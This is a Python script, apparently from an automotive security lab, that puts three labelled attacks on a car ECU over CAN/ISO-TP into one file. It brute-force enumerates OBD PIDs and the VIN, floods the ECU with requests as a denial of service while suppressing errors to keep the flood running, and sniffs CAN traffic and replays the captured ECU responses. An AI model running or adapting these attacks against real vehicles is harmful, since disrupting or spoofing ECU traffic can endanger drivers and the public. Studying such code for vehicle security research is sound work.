import time                  # Provides time-related functions (sleep, current time, durations)
import config                # Stores configuration values such as CAN IDs
import utils                 # General helper utilities (kept for project consistency)
from transport import tm     # Transport manager handling ISO-TP and raw CAN operations

# ============================================================
# ISO-TP HELPER FUNCTIONS
# ============================================================
# Purpose:
# These functions are thin wrappers around the transport manager (tm).
# They exist to keep the calling style simple and consistent across the project.

def ISOTP_SEND(data, txid, rxid):
    """
    Send an ISO-TP request.

    data : bytes
        Payload to send (UDS / OBD request).
    txid : int
        CAN ID used to transmit the request (tester → ECU).
    rxid : int
        CAN ID expected for the response (ECU → tester).
    """
    tm.send(data, txid, rxid)

def ISOTP_RECEIVE(txid, rxid, timeout=0.0):
    """
    Receive an ISO-TP response.

    txid : int
        CAN ID used for transmission.
    rxid : int
        CAN ID used for reception.
    timeout : float
        Maximum time to wait for a response.
    """
    return tm.receive(txid, rxid, timeout)

def pretty_hex(b: bytes) -> str:
    """
    Convert raw bytes into a human-readable hexadecimal string.
    Example: b'\\x01\\x0C' → '01 0C'
    """
    return " ".join(f"{x:02X}" for x in b)

# ============================================================
# ATTACK 1: PID ENUMERATION
# ============================================================
def scan_mode_pids(mode: int, pid_start: int = 0x00, pid_end: int = 0xFF, timeout: float = 0.5):
    """
    Brute-force all possible PIDs for a given OBD mode.

    Purpose:
    Discover which PIDs are supported by the ECU for a specific OBD mode.

    mode : int
        OBD mode to scan (e.g. 0x01, 0x09).
    pid_start : int
        First PID to test.
    pid_end : int
        Last PID to test.
    timeout : float
        Time to wait for a response per PID.
    """
    supported = {}  # Stores supported PIDs and their returned data
    print(f"\n=== Scanning Mode 0x{mode:02X} ===")

    for pid in range(pid_start, pid_end + 1):
        # Build OBD request: [MODE, PID]
        req = bytes([mode, pid])

        # Send request to ECU
        ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

        # Small delay to avoid overwhelming the ECU
        time.sleep(0.1)

        # Wait for ECU response
        resp = ISOTP_RECEIVE(
            txid=config.ID_ECU_PHYSICAL,
            rxid=config.ID_ECU_RESPONSE,
            timeout=timeout
        )

        # If there is no response, the PID is considered unsupported
        if resp is None or len(resp) == 0:
            continue

        # ---------------- MODE 01 HANDLING ----------------
        # Expected response format:
        #   41 <PID> <DATA...>
        if mode == 0x01:
            if len(resp) < 2:
                continue
            if resp[0] != 0x41:
                continue
            if resp[1] != pid:
                continue
            data = resp[2:]

        # ---------------- MODE 09 HANDLING ----------------
        # PID 02 returns the VIN as raw bytes
        elif mode == 0x09:
            if pid == 0x02 and resp[0] not in (0x12, 0x7F):
                data = resp[:]   # Entire payload is VIN data
            else:
                continue

        # ---------------- GENERIC MODE HANDLING ----------------
        # Expected response format:
        #   (MODE + 0x40) <PID> <DATA...>
        else:
            if len(resp) < 2:
                continue
            if resp[0] != (mode + 0x40):
                continue
            if resp[1] != pid:
                continue
            data = resp[2:]

        # If all checks passed, the PID is supported
        supported[pid] = data
        print(f"[+] Mode 0x{mode:02X} PID 0x{pid:02X} | Resp: {pretty_hex(resp)}")

    # Print summary for this mode
    print(f"[*] Mode 0x{mode:02X} → {len(supported)} supported PIDs\n")
    return supported

def PID_ENUMERATIONS():
    """
    Enumerate supported PIDs for all enabled OBD modes.
    """
    # Clear any old CAN / ISO-TP messages before starting
    tm.clear_queues()

    print("[*] Starting PID Enumeration for all OBD modes..\n")

    # Only scan modes implemented by the ECU
    MODES_TO_SCAN = [0x01, 0x09]
    all_supported = {}

    for mode in MODES_TO_SCAN:
        all_supported[mode] = scan_mode_pids(mode)

    # ---------------- GLOBAL SUMMARY ----------------
    print("\n========== GLOBAL SUMMARY ==========")
    total = 0

    for mode, pids in all_supported.items():
        print(f"\nMode 0x{mode:02X}: {len(pids)} PIDs")
        for pid, data in pids.items():
            data_str = pretty_hex(data) if data else "(no data)"
            print(f"  PID 0x{pid:02X} → {data_str}")
        total += len(pids)

    print("\n====================================")
    print(f"[*] Total Supported PID/Mode pairs found: {total}")
    print("====================================\n")

# ============================================================
# ATTACK 2: OBD DENIAL OF SERVICE (DoS)
# ============================================================
def OBD_DOS(duration_seconds):
    """
    Flood the ECU with repeated OBD requests for a fixed duration.

    Purpose:
    Stress the ECU communication stack by sending continuous requests.
    """
    tm.clear_queues()

    # Simple OBD request used for flooding
    req = bytes([0x00, 0x02])

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
            frame_count += 1
        except Exception:
            # Ignore errors to keep flooding active
            continue

    print(f"[DoS] Sent {frame_count} frames with ID {config.ID_ECU_PHYSICAL:03X}")

# ============================================================
# ATTACK 3: SNIFF AND REPLAY
# ============================================================
def OBD_SNIFF_AND_REPLAY(duration_seconds: int = 10, replay_delay: float = 0.01):
    """
    Sniff CAN traffic for a period of time, then replay ECU responses.

    Purpose:
    Capture legitimate ECU frames and replay them to simulate or abuse behavior.
    """
    tm.clear_queues()

    print(f"\n[REPLAY] Sniffing for {duration_seconds} seconds on vcan0 ...")

    captured = []  # Stores (CAN ID, DLC, DATA)
    end_time = time.time() + duration_seconds

    # Capture raw CAN frames
    while time.time() < end_time:
        msg = tm.bus.recv(timeout=0.2)
        if msg is None:
            continue

        data_bytes = bytes(msg.data)
        print(f"[SNIFF] {msg.arbitration_id:03X}|{msg.dlc}|{pretty_hex(data_bytes)}")
        captured.append((msg.arbitration_id, msg.dlc, data_bytes))

    print(f"[REPLAY] Sniffing done. Captured {len(captured)} frames.")

    if not captured:
        print("[REPLAY] Nothing to replay.")
        return

    print("[REPLAY] Replaying captured ECU responses only ...")

    count = 0
    for can_id, dlc, data_bytes in captured:
        # Skip tester-originated frames
        if can_id == config.ID_ECU_PHYSICAL:
            continue

        payload = data_bytes[:dlc]

        import can  # Local import for clarity

        msg = can.Message(
            arbitration_id=can_id,
            data=payload,
            is_extended_id=False
        )

        try:
            tm.bus.send(msg)
            count += 1
            print(f"[REPLAY] → ID={can_id:03X} DLC={dlc} DATA={pretty_hex(payload)}")
        except Exception:
            continue

        time.sleep(replay_delay)

    print(f"[REPLAY] Finished. Replayed {count} frames.")
